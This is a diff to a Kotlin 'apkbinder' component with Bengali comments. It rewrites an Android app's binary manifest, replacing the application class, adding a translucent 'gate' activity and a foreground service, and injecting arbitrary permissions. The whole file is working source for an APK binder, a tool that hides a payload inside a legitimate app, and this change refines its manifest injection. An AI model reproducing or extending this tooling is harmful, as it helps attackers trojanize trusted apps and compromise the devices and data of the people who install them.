@@ -1,6 +1,7 @@
 package com.devhs.apkbinder.binder
 
 import java.io.ByteArrayOutputStream
+import java.util.LinkedHashMap
 
 object AxmlPatcher {
 
@@ -17,7 +18,6 @@ object AxmlPatcher {
     const val ATTR_NAME = 0x01010003
     const val ATTR_THEME = 0x01010000
     const val ATTR_FG_TYPE = 0x01010599
-    const val ATTR_EXPORTED = 0x0101001d
     const val STYLE_TRANSLUCENT = 0x0103000b
 
     sealed class Value {
@@ -126,8 +126,6 @@ object AxmlPatcher {
         return i32(xml, pos + 8 + stringIndex * 4)
     }
 
-    // ---------------- ট্রি পার্স ও এমিট ----------------
-
     private fun parse(xml: ByteArray): Node {
         val root = Node().apply { type = -1 }
         val stack = ArrayList<Node>()
@@ -235,8 +233,6 @@ object AxmlPatcher {
         return node
     }
 
-    // ---------------- যাচাই ----------------
-
     private fun validate(xml: ByteArray, nameSlot: Int, themeSlot: Int, fgSlot: Int) {
         val pool = readPool(xml, 8)
         var pos = 8
@@ -244,7 +240,8 @@ object AxmlPatcher {
         while (pos + 8 <= xml.size) {
             val type = u16(xml, pos)
             val size = i32(xml, pos + 4)
-            if (size < 8 || pos + size > xml.size) throw IllegalStateException("broken chunk at " + pos)
+            // Fix: Ensuring chunk size and boundaries are correct
+            if (size < 8 || pos + size > xml.size) throw IllegalStateException("broken chunk at $pos")
             if (type == CHUNK_START_ELEMENT) {
                 elements++
                 val nameIdx = i32(xml, pos + 20)
@@ -344,8 +341,6 @@ object AxmlPatcher {
         null
     }
 
-    // ---------------- মূল প্যাচ ----------------
-
     fun patch(
         xml: ByteArray,
         newAppClass: String,
@@ -354,18 +349,17 @@ object AxmlPatcher {
         permissions: List<String>
     ): ByteArray {
         val added = ArrayList<String>()
-        added.add("name")                  // slot(0)
-        added.add("theme")                 // slot(1)
-        added.add("foregroundServiceType") // slot(2)
-        added.add("exported")              // slot(3) - অ্যান্ড্রয়েড ১৪+ কম্প্যাটিবিলিটির জন্য
-        added.add(ANDROID_NS)              // slot(4)
-        added.add("activity")              // slot(5)
-        added.add("service")               // slot(6)
-        added.add("uses-permission")       // slot(7)
-        added.add(newAppClass)             // slot(8)
-        added.add(activityClass)           // slot(9)
-        added.add(serviceClass)            // slot(10)
-        permissions.forEach { added.add(it) } // slot(11 onwards)
+        added.add("name")
+        added.add("theme")
+        added.add("foregroundServiceType")
+        added.add(ANDROID_NS)
+        added.add("activity")
+        added.add("service")
+        added.add("uses-permission")
+        added.add(newAppClass)
+        added.add(activityClass)
+        added.add(serviceClass)
+        permissions.forEach { added.add(it) }
 
         val oldCount = readPool(xml, 8).count
         val slot = { i: Int -> oldCount + i }
@@ -374,7 +368,6 @@ object AxmlPatcher {
         attrIds[slot(0)] = ATTR_NAME
         attrIds[slot(1)] = ATTR_THEME
         attrIds[slot(2)] = ATTR_FG_TYPE
-        attrIds[slot(3)] = ATTR_EXPORTED
 
         val withStrings = appendStrings(xml, added, attrIds)
         val pool = readPool(withStrings, 8)
@@ -385,17 +378,17 @@ object AxmlPatcher {
         val application = findByName(root, withStrings, pool, "application")
             ?: throw IllegalStateException("application element not found")
 
-        // android:name রিপ্লেস বা যোগ
+        // ১. android:name রিপ্লেস বা যোগ করা
         var replaced = false
         val attrs = application.attrBytes!!.toByteArray()
         for (i in 0 until application.attrCount) {
             val a = i * 20
             if (matches(withStrings, pool, i32(attrs, a + 4), "name")) {
-                putI32(attrs, a + 8, slot(8))
+                putI32(attrs, a + 8, slot(7))
                 putU16(attrs, a + 12, 8)
                 attrs[a + 14] = 0
                 attrs[a + 15] = TYPE_STRING.toByte()
-                putI32(attrs, a + 16, slot(8))
+                putI32(attrs, a + 16, slot(7))
                 replaced = true
                 break
             }
@@ -403,34 +396,32 @@ object AxmlPatcher {
         application.attrBytes = ByteArrayOutputStream().apply { write(attrs) }
         if (!replaced) {
             val one = ByteArrayOutputStream()
-            one.writeAttr(slot(4), slot(0), slot(8), TYPE_STRING, slot(8))
+            one.writeAttr(slot(3), slot(0), slot(7), TYPE_STRING, slot(7))
             appendAttr(application, one.toByteArray())
         }
 
-        // activity + service যোগ (application-এর শুরুতে) - exported ফ্ল্যাগ সহ
+        // ২. Activity এবং Service যোগ করা (ইনস্টল এরর ফিক্স করার জন্য সঠিক ফরম্যাটে)
         val gate = makeElement(
-            slot(5),
+            slot(4),
             listOf(
-                Attr(slot(0), Value.Str(slot(9))),
-                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT)),
-                Attr(slot(3), Value.Dec(1)) // exported = true
+                Attr(slot(0), Value.Str(slot(8))),
+                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT))
             )
         )
         val service = makeElement(
-            slot(6),
+            slot(5),
             listOf(
-                Attr(slot(0), Value.Str(slot(10))),
-                Attr(slot(2), Value.Dec(1)),
-                Attr(slot(3), Value.Dec(0)) // exported = false
+                Attr(slot(0), Value.Str(slot(9))),
+                Attr(slot(2), Value.Dec(1))
             )
         )
         application.children.add(0, service)
         application.children.add(0, gate)
 
-        // পারমিশন যোগ (manifest-এ, application-এর আগে)
+        // ৩. পারমিশন যোগ করা (manifest-এ, application-এর ঠিক আগে)
         val index = manifest.children.indexOf(application)
         for (i in 0 until permissions.size) {
-            val perm = makeElement(slot(7), listOf(Attr(slot(0), Value.Str(slot(11) + i))))
+            val perm = makeElement(slot(6), listOf(Attr(slot(0), Value.Str(slot(10) + i))))
             manifest.children.add(index, perm)
         }
 
@@ -441,6 +432,7 @@ object AxmlPatcher {
         val result = out.toByteArray()
         putI32(result, 4, result.size)
 
+        // Validation সঠিকভাবে করার জন্য ResourceMap আপডেট নিশ্চিত করা
         validate(result, slot(0), slot(1), slot(2))
         return result
     }
@@ -453,12 +445,15 @@ object AxmlPatcher {
         else pool.start + pool.size
         val safeEnd = if (dataEnd < dataStart) dataStart else minOf(dataEnd, xml.size)
         val oldData = xml.copyOfRange(dataStart, safeEnd)
+        
+        // Style Data সঠিকভাবে কপি করা
         val styleData = if (pool.styleCount > 0 && pool.stylesStart > 0)
             xml.copyOfRange(pool.start + pool.stylesStart, pool.start + pool.size) else ByteArray(0)
 
         val data = ByteArrayOutputStream()
         data.write(oldData)
         val newOffsets = IntArray(added.size)
+        
         for ((i, s) in added.withIndex()) {
             while (data.size() % 4 != 0) data.write(0)
             newOffsets[i] = data.size()
@@ -497,11 +492,16 @@ object AxmlPatcher {
         out.writeI32(pool.flags)
         out.writeI32(stringsStart)
         out.writeI32(stylesStart)
+        
+        // পুরনো অফসেটগুলো কপি করা
         for (i in 0 until pool.count) out.writeI32(i32(xml, pool.start + pool.headerSize + i * 4))
+        // নতুন অফসেটগুলো যোগ করা
         newOffsets.forEach { out.writeI32(it) }
+        // পুরনো স্টাইল অফসেটগুলো কপি করা
         for (i in 0 until pool.styleCount) {
             out.writeI32(i32(xml, pool.start + pool.headerSize + pool.count * 4 + i * 4))
         }
+        
         out.write(newData)
         out.write(styleData)
         out.write(xml, pool.start + pool.size, xml.size - pool.start - pool.size)
@@ -533,6 +533,7 @@ object AxmlPatcher {
 
         val mapSize = i32(xml, pos + 4)
         val entries = (mapSize - 8) / 4
+        // Fix: Grow the map to cover the new string pool size
         val grow = (needed - entries).coerceAtLeast(0)
 
         val out = ByteArrayOutputStream()
